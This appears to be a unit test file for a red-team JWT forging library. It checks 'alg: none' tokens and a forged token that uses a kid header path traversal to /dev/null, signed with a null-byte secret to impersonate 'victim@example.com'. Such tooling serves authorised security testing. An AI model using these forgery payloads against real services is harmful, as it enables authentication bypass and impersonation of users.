"""Tests for the stdlib JWT forge."""

import hashlib
import hmac

from valen.redteam.jwt import (
    b64url_decode,
    b64url_encode,
    decode_unverified,
    encode_hs256,
    encode_none,
    forge_kid_path_traversal,
)


def test_b64url_roundtrip():
    assert b64url_decode(b64url_encode(b"hello world")) == b"hello world"
    assert b64url_decode(b64url_encode(b"\x00\x01")) == b"\x00\x01"


def test_decode_unverified():
    tok = encode_hs256({"sub": "a@b.c"}, b"secret")
    header, payload, sig = decode_unverified(tok)
    assert header["alg"] == "HS256"
    assert payload["sub"] == "a@b.c"
    assert sig


def test_encode_hs256_signs_with_hmac():
    tok = encode_hs256({"sub": "x"}, b"secret")
    h, p, s = tok.split(".")
    expected = hmac.new(b"secret", f"{h}.{p}".encode(), hashlib.sha256).digest()
    assert b64url_decode(s) == expected


def test_encode_none_has_empty_signature():
    tok = encode_none({"sub": "x"})
    assert tok.endswith(".")
    header, _, _ = decode_unverified(tok)
    assert header["alg"] == "none"


def test_forge_kid_path_traversal():
    tok = forge_kid_path_traversal({"sub": "victim@example.com"})
    header, payload, _ = decode_unverified(tok)
    assert header["alg"] == "HS256"
    assert header["kid"] == "../../../../../../dev/null"
    assert payload["sub"] == "victim@example.com"
    # signed with the null-byte secret (base64 "AA==")
    h, p, s = tok.split(".")
    expected = hmac.new(b"\x00", f"{h}.{p}".encode(), hashlib.sha256).digest()
    assert b64url_decode(s) == expected
